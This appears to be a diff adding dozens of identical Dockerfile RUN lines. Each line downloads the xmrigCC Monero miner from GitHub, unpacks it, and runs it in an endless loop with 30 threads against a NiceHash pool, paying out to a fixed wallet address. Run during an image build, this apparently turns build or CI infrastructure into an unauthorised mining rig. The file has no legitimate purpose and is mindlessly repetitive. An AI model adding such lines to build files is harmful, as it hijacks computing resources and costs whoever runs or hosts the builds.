+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
+RUN cd sus/ && lscpu && wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && pwd && ls && tar -xf xmrigCC-miner_only-3.3.3-linux-dynamic-amd64.tar.gz && while true; do timeout 15m ./xmrigDaemon --donate-level 1 -o randomxmonero.usa-west.nicehash.com:3380 -u 3DLaGkGmGrb9FTik1wwB88w1zsRhAor3NP.beamnew -p x -a rx/0 -k -t 30 || break; done
+
